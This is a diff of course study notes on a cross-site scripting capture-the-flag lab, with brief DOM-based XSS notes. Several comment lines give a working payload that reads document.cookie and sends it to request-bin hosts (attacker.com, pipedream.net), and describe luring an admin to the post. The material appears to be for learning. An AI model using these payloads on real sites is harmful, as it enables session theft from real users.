@@ -14,3 +14,28 @@
 #      i.src = "HTTP://normaltic.attacker.com/
 #      i.src = "HTTP://normaltic.attacker.com/?cookie=" + "Secret_data";
 #      i.src = "HTTP://normaltic.attacker.com/?cookie=" + cookieData;
+#  5. VPS or requestbin
+#    - https://public.requestbin.com/r/
+
+#  6. XSS
+#    1) CTF XSS 1
+#      - Annoucement and create content "<script>alert(1)</script>" on the subject.
+#      - When you click it, the alert shows up.
+#      - Instead of alert(1), put var i = new Image(); i.src = "HTTP://en7riltg206nc.x.pipedream.net/getCrred.php?cookie=" + cookieData;
+#      - In Burpsuite, instead of alert(1), put var cookieData = document.cookie; 
+#                                               var i = new Image();
+#                                               i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;
+#      - On the admin visit url = type the address made by the attack post
+#      - Check the flag on https://public.requestbin.com/
+
+#  7. DOM Based XSS
+#    - Create a tag by using javascript
+#    - Create and execute a new script from a browser
+#    - an XSS attack wherein the attack payload is executed as a result of modifying the DOM “environment” in the victim's browser used by the original client side script,
+#    - document.write = "";
+#    - innerHTML
+
+#  8. Assignment
+#    - Review
+#    - XSS CTF
+#    
